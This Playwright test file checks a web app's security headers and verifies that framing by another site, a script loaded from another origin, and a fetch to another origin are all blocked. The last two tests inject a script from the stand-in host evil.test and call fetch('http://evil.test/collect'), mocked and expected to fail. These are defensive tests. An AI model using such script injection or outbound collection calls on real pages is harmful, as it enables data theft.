import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { expect, test } from '@playwright/test';
import { resetAll } from './helpers';

// WI-SEC-005 / register item 134: the browser hardening headers, and that they do what they are for: no other site can frame the app, and a script
// from another origin does not run. (The same file is in apps/web-customer/tests/e2e.)

test.beforeEach(async () => {
  await resetAll();
});

const ROUTES: [string, 'GET' | 'POST'][] = [
  ['/', 'GET'],
  ['/auth/error?code=expired', 'GET'],
  ['/no-such-page', 'GET'],
  ['/api/auth/me', 'GET'],
  ['/api/graphql', 'POST'], // refused (no origin), but the refusal carries the headers too
];

test('every kind of response carries the hardening headers', async ({ request }) => {
  for (const [path, method] of ROUTES) {
    const res = method === 'GET' ? await request.get(path) : await request.post(path, { data: '{}' });
    const h = res.headers();
    const where = `${method} ${path} (${res.status()})`;
    expect(h['x-frame-options'], where).toBe('DENY');
    expect(h['x-content-type-options'], where).toBe('nosniff');
    expect(h['referrer-policy'], where).toMatch(/^(strict-origin-when-cross-origin|no-referrer)$/);
    expect(h['permissions-policy'], where).toContain('camera=()');
    const csp = h['content-security-policy'] ?? '';
    for (const directive of [
      "default-src 'self'",
      "frame-ancestors 'none'",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "connect-src 'self'",
    ])
      expect(csp, `${where}: ${directive}`).toContain(directive);
    expect(csp, where).not.toContain('script-src *');
    expect(csp, where).not.toContain("'unsafe-eval'"); // only `next dev` adds it
  }
});

test('another site cannot put the app in a frame', async ({ page, baseURL }) => {
  // The other site is a second local server on another origin (127.0.0.1 and a different port), serving a page with a frame onto the app.
  const embedder = http.createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(`<html><body><iframe id="victim" src="${baseURL}/"></iframe></body></html>`);
  });
  await new Promise<void>((resolve) => embedder.listen(0, '127.0.0.1', resolve));
  try {
    const port = (embedder.address() as AddressInfo).port;
    await page.goto(`http://127.0.0.1:${port}/`);
    await page.waitForTimeout(2000); // the frame loads, or is refused

    const frames = page.frames().filter((f) => f !== page.mainFrame());
    expect(frames.length).toBe(1);
    for (const frame of frames) {
      // A refused frame may have no document to read (Firefox never answers), which is the point; do not wait for it.
      const content = await Promise.race([
        frame.content().catch(() => ''),
        new Promise<string>((resolve) => setTimeout(() => resolve(''), 3000)),
      ]);
      expect(content.includes('__NEXT_DATA__'), `the app's page was rendered in a frame at ${frame.url()}`).toBe(false);
    }
  } finally {
    embedder.closeAllConnections();
    embedder.close();
  }
});

test('a script from another origin does not run, and the browser reports the violation', async ({ page }) => {
  let requested = false;
  await page.route('http://evil.test/**', (route) => {
    requested = true;
    return route.fulfill({ contentType: 'text/javascript', body: 'window.__evil = 1;' });
  });
  await page.goto('/auth/error?code=expired');

  const result = await page.evaluate(
    () =>
      new Promise<{ violated: string | null; ran: boolean }>((resolve) => {
        let violated: string | null = null;
        document.addEventListener('securitypolicyviolation', (e) => (violated = e.violatedDirective));
        const s = document.createElement('script');
        s.src = 'http://evil.test/x.js';
        s.onload = () => resolve({ violated, ran: (window as unknown as { __evil?: number }).__evil === 1 });
        s.onerror = () =>
          setTimeout(() => resolve({ violated, ran: (window as unknown as { __evil?: number }).__evil === 1 }), 100);
        document.head.appendChild(s);
      }),
  );

  expect(result.ran).toBe(false);
  expect(result.violated ?? '').toContain('script-src');
  expect(requested).toBe(false);
});

test('a request from the page to another origin is blocked by connect-src', async ({ page }) => {
  let requested = false;
  await page.route('http://evil.test/**', (route) => {
    requested = true;
    return route.fulfill({ status: 200, body: 'ok', headers: { 'access-control-allow-origin': '*' } });
  });
  await page.goto('/auth/error?code=expired');

  const outcome = await page.evaluate(() =>
    fetch('http://evil.test/collect').then(
      () => 'sent',
      () => 'blocked',
    ),
  );

  expect(outcome).toBe('blocked');
  expect(requested).toBe(false);
});
